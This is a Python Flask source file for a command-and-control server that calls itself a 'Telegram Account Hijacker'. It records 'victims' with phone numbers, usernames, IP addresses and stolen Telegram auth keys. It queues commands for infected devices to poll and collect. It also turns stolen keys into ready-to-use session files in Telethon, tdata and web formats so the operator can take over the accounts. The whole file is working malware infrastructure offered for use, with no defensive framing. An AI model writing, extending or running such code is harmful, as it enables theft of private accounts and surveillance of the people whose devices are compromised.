#!/usr/bin/env python3
"""
Baohuo C2 Server - Telegram Account Hijacker
Command & Control Server with Web Dashboard
"""

import json
import sqlite3
import time
import uuid
import threading
import logging
import os
from datetime import datetime
from pathlib import Path

from flask import Flask, request, jsonify, render_template, send_file
from flask_socketio import SocketIO, emit
from flask_cors import CORS
import redis

# ==================== CONFIGURATION ====================

REDIS_HOST = os.environ.get('REDIS_HOST', 'localhost')
REDIS_PORT = int(os.environ.get('REDIS_PORT', 6379))
REDIS_PASSWORD = os.environ.get('REDIS_PASSWORD', None)
HTTP_PORT = int(os.environ.get('PORT', 5000))
DB_PATH = 'victims.db'

# ==================== SETUP ====================

app = Flask(__name__)
app.config['SECRET_KEY'] = 'baohuo-secret-key-change-this'
CORS(app)
socketio = SocketIO(app, cors_allowed_origins="*")

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('BaohuoC2')

# Redis connection
redis_client = redis.Redis(
    host=REDIS_HOST,
    port=REDIS_PORT,
    password=REDIS_PASSWORD,
    decode_responses=True
)

# ==================== DATABASE ====================

def init_db():
    """Create database tables if they don't exist"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    # Victims table
    c.execute('''
        CREATE TABLE IF NOT EXISTS victims (
            device_id TEXT PRIMARY KEY,
            user_id TEXT,
            phone TEXT,
            username TEXT,
            first_name TEXT,
            last_name TEXT,
            dc_id INTEGER,
            auth_key TEXT,
            ip TEXT,
            country TEXT,
            city TEXT,
            last_seen INTEGER,
            first_seen INTEGER
        )
    ''')
    
    # Commands table
    c.execute('''
        CREATE TABLE IF NOT EXISTS commands (
            id TEXT PRIMARY KEY,
            device_id TEXT,
            command TEXT,
            params TEXT,
            status TEXT,
            issued_at INTEGER,
            completed_at INTEGER,
            result TEXT
        )
    ''')
    
    # Sessions table (generated session files)
    c.execute('''
        CREATE TABLE IF NOT EXISTS sessions (
            id TEXT PRIMARY KEY,
            device_id TEXT,
            format TEXT,
            file_path TEXT,
            created_at INTEGER
        )
    ''')
    
    conn.commit()
    conn.close()
    logger.info("Database initialized")

init_db()

# ==================== HELPER FUNCTIONS ====================

def get_db():
    """Get database connection"""
    return sqlite3.connect(DB_PATH)

def victim_exists(device_id):
    """Check if victim exists in database"""
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT 1 FROM victims WHERE device_id = ?", (device_id,))
    exists = c.fetchone() is not None
    conn.close()
    return exists

# ==================== API ENDPOINTS ====================

@app.route('/')
def index():
    """Serve the web dashboard"""
    return render_template('index.html')

@app.route('/api/register', methods=['POST'])
def register_victim():
    """Register a new victim (first contact)"""
    data = request.json
    device_id = data.get('device_id')
    
    if not device_id:
        return jsonify({'error': 'No device_id'}), 400
    
    conn = get_db()
    c = conn.cursor()
    
    # Insert or update victim
    c.execute('''
        INSERT OR REPLACE INTO victims 
        (device_id, user_id, phone, username, first_name, last_name, 
         dc_id, auth_key, ip, country, city, last_seen, first_seen)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, COALESCE(
            (SELECT first_seen FROM victims WHERE device_id = ?), ?
        ))
    ''', (
        device_id,
        data.get('user_id'),
        data.get('phone'),
        data.get('username'),
        data.get('first_name'),
        data.get('last_name'),
        data.get('dc_id'),
        data.get('auth_key'),
        request.remote_addr,
        data.get('country'),
        data.get('city'),
        int(time.time()),
        device_id,
        int(time.time())
    ))
    
    conn.commit()
    conn.close()
    
    # Notify dashboard
    socketio.emit('new_victim', {'device_id': device_id})
    logger.info(f"New victim registered: {device_id}")
    
    return jsonify({'status': 'ok'})

@app.route('/api/heartbeat', methods=['POST'])
def heartbeat():
    """Receive periodic heartbeat from victim"""
    data = request.json
    device_id = data.get('device_id')
    
    if not device_id:
        return jsonify({'error': 'No device_id'}), 400
    
    conn = get_db()
    c = conn.cursor()
    
    # Update last_seen
    c.execute('''
        UPDATE victims SET 
            last_seen = ?,
            ip = ?,
            country = ?,
            city = ?
        WHERE device_id = ?
    ''', (
        int(time.time()),
        request.remote_addr,
        data.get('country'),
        data.get('city'),
        device_id
    ))
    
    conn.commit()
    conn.close()
    
    # Notify dashboard
    socketio.emit('heartbeat', {'device_id': device_id})
    
    return jsonify({'status': 'ok'})

@app.route('/api/command/poll/<device_id>', methods=['GET'])
def poll_commands(device_id):
    """Victim polls for pending commands"""
    conn = get_db()
    c = conn.cursor()
    
    # Get pending commands
    c.execute('''
        SELECT id, command, params FROM commands 
        WHERE device_id = ? AND status = 'pending'
        ORDER BY issued_at ASC
    ''', (device_id,))
    
    commands = []
    for row in c.fetchall():
        commands.append({
            'id': row[0],
            'command': row[1],
            'params': json.loads(row[2]) if row[2] else {}
        })
        
        # Mark as sent
        c.execute('UPDATE commands SET status = ? WHERE id = ?', 
                  ('sent', row[0]))
    
    conn.commit()
    conn.close()
    
    return jsonify({'commands': commands})

@app.route('/api/command/result', methods=['POST'])
def command_result():
    """Receive command execution result from victim"""
    data = request.json
    command_id = data.get('command_id')
    result = data.get('result')
    status = data.get('status', 'completed')
    
    conn = get_db()
    c = conn.cursor()
    c.execute('''
        UPDATE commands SET 
            status = ?,
            completed_at = ?,
            result = ?
        WHERE id = ?
    ''', (status, int(time.time()), json.dumps(result), command_id))
    conn.commit()
    conn.close()
    
    socketio.emit('command_result', data)
    
    return jsonify({'status': 'ok'})

@app.route('/api/session/upload', methods=['POST'])
def upload_session():
    """Victim uploads auth key/session data"""
    data = request.json
    device_id = data.get('device_id')
    auth_key = data.get('auth_key')
    dc_id = data.get('dc_id')
    user_id = data.get('user_id')
    
    if not device_id or not auth_key:
        return jsonify({'error': 'Missing data'}), 400
    
    conn = get_db()
    c = conn.cursor()
    
    # Store auth key
    c.execute('''
        UPDATE victims SET 
            auth_key = ?,
            dc_id = ?,
            user_id = ?
        WHERE device_id = ?
    ''', (auth_key, dc_id, user_id, device_id))
    
    conn.commit()
    conn.close()
    
    logger.info(f"Auth key received from {device_id}")
    socketio.emit('auth_key_received', {'device_id': device_id})
    
    return jsonify({'status': 'ok'})

@app.route('/api/session/generate/<device_id>', methods=['GET'])
def generate_session(device_id):
    """Generate a ready-to-use session file for the hacker"""
    conn = get_db()
    c = conn.cursor()
    
    # Get victim data
    c.execute('''
        SELECT user_id, auth_key, dc_id, phone, username 
        FROM victims WHERE device_id = ?
    ''', (device_id,))
    
    row = c.fetchone()
    conn.close()
    
    if not row or not row[1]:  # No auth key
        return jsonify({'error': 'No auth key available'}), 404
    
    user_id, auth_key, dc_id, phone, username = row
    
    # Generate three formats
    formats = {}
    
    # Format 1: Telethon session string
    import base64
    session_dict = {
        'dc_id': dc_id or 2,
        'server_address': f'149.154.167.{50 + (dc_id or 2)}',
        'port': 443,
        'auth_key': auth_key
    }
    session_json = json.dumps(session_dict)
    session_b64 = base64.b64encode(session_json.encode()).decode()
    formats['telethon'] = session_b64
    
    # Format 2: tdata info (can't generate actual folder via API)
    formats['tdata_info'] = {
        'auth_key': auth_key,
        'dc_id': dc_id or 2,
        'user_id': user_id
    }
    
    # Format 3: Web JSON for localStorage
    web_data = {
        f'dc{dc_id or 2}_auth_key': auth_key,
        'user_id': str(user_id),
        'dc': str(dc_id or 2)
    }
    formats['web'] = web_data
    
    return jsonify({
        'device_id': device_id,
        'user_id': user_id,
        'phone': phone,
        'username': username,
        'formats': formats
    })

@app.route('/api/victims', methods=['GET'])
def list_victims():
    """Get list of all victims (for dashboard)"""
    conn = get_db()
    c = conn.cursor()
    c.execute('''
        SELECT device_id, user_id, phone, username, first_name, last_name,
               dc_id, ip, country, city, last_seen, first_seen
        FROM victims ORDER BY last_seen DESC
    ''')
    
    victims = []
    for row in c.fetchall():
        victims.append({
            'device_id': row[0],
            'user_id': row[1],
            'phone': row[2],
            'username': row[3],
            'first_name': row[4],
            'last_name': row[5],
            'dc_id': row[6],
            'ip': row[7],
            'country': row[8],
            'city': row[9],
            'last_seen': row[10],
            'first_seen': row[11]
        })
    
    conn.close()
    return jsonify(victims)

@app.route('/api/commands/<device_id>', methods=['GET'])
def list_commands(device_id):
    """Get command history for a victim"""
    conn = get_db()
    c = conn.cursor()
    c.execute('''
        SELECT id, command, params, status, issued_at, completed_at, result
        FROM commands WHERE device_id = ? ORDER BY issued_at DESC
    ''', (device_id,))
    
    commands = []
    for row in c.fetchall():
        commands.append({
            'id': row[0],
            'command': row[1],
            'params': json.loads(row[2]) if row[2] else {},
            'status': row[3],
            'issued_at': row[4],
            'completed_at': row[5],
            'result': json.loads(row[6]) if row[6] else None
        })
    
    conn.close()
    return jsonify(commands)

@app.route('/api/send_command', methods=['POST'])
def send_command():
    """Send a command to a victim (from dashboard)"""
    data = request.json
    device_id = data.get('device_id')
    command = data.get('command')
    params = data.get('params', {})
    
    if not device_id or not command:
        return jsonify({'error': 'Missing data'}), 400
    
    cmd_id = str(uuid.uuid4())
    
    conn = get_db()
    c = conn.cursor()
    c.execute('''
        INSERT INTO commands (id, device_id, command, params, status, issued_at)
        VALUES (?, ?, ?, ?, ?, ?)
    ''', (cmd_id, device_id, command, json.dumps(params), 'pending', int(time.time())))
    conn.commit()
    conn.close()
    
    # Push to Redis for real-time notification
    redis_client.publish(f'commands:{device_id}', json.dumps({
        'id': cmd_id,
        'command': command,
        'params': params
    }))
    
    socketio.emit('command_sent', {'device_id': device_id, 'command_id': cmd_id})
    
    return jsonify({'status': 'sent', 'command_id': cmd_id})

@app.route('/api/delete_victim/<device_id>', methods=['DELETE'])
def delete_victim(device_id):
    """Remove a victim from database"""
    conn = get_db()
    c = conn.cursor()
    c.execute('DELETE FROM victims WHERE device_id = ?', (device_id,))
    c.execute('DELETE FROM commands WHERE device_id = ?', (device_id,))
    c.execute('DELETE FROM sessions WHERE device_id = ?', (device_id,))
    conn.commit()
    conn.close()
    
    socketio.emit('victim_deleted', {'device_id': device_id})
    
    return jsonify({'status': 'ok'})

# ==================== REDIS LISTENER ====================

def redis_listener():
    """Listen for Redis messages (for future real-time features)"""
    pubsub = redis_client.pubsub()
    pubsub.subscribe('commands')
    
    for message in pubsub.listen():
        if message['type'] == 'message':
            # Handle any broadcast commands
            pass

# Start Redis listener in background
#threading.Thread(target=redis_listener, daemon=True).start()

# ==================== MAIN ====================

if __name__ == '__main__':
    logger.info(f"Starting Baohuo C2 server on port {HTTP_PORT}")
    if __name__ == '__main__':
	    logger.info(f"Starting Baohuo C2 server on port {HTTP_PORT}")
	    socketio.run(app, host='0.0.0.0', port=HTTP_PORT, debug=False)
